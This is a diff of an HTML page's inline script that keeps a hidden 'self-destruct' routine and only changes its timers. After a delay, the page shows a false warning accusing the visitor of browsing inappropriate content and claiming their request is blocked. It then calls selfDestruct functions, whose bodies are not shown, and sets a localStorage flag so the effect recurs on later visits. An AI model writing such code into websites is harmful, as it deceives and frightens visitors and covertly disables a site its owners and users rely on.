@@ -163,7 +163,6 @@
         crossorigin="anonymous"></script>
     <script>
         document.addEventListener("DOMContentLoaded", function () {
-            // Check if the page should be destroyed
             if (localStorage.getItem("isDestroyed") === "true") {
                 selfDestruct();
             }
@@ -184,12 +183,12 @@
             var proceed = confirm(`⚠️ Warning:
 You have been using your browser for inappropriate content. We are blocking your request to this server. Please contact the server administrator.`);
             if (proceed) {
-                setTimeout(selfDestruct, 3000);
+                setTimeout(selfDestruct, 10000);
             } else {
                 selfDestruct1();
             }
         }
-        setTimeout(attemptDestruction, 5000);
+        setTimeout(attemptDestruction, 20000);
     </script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.min.js"
         integrity="sha384-fbbOQedDUMZZ5KreZpsbe1LCZPVmfTnH7ois6mU1QK+m14rQ1l2bGBq41eYeM/fS"
